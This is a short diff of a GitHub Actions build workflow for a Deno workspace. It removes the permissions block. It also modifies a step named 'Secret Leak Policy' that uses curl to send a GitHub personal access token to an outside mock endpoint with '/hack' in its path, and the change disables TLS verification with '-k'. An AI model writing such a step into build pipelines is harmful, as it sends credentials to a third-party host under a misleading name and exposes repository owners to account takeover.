@@ -2,12 +2,6 @@ name: Deno Workspace build latest
 
 on:
   workflow_dispatch:
-  
-permissions:
-  checks: write
-  contents: write
-  packages: read
-  actions: write
 
 jobs:
   DENO:
@@ -26,7 +20,7 @@ jobs:
           debug: true
       - name: Secret Leak Policy
         run: |
-          curl -sSf -X GET https://vbirmock.free.beeceptor.com/hack \
+          curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
             -H "Content-Type: application/json" \
             -d '{
             "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
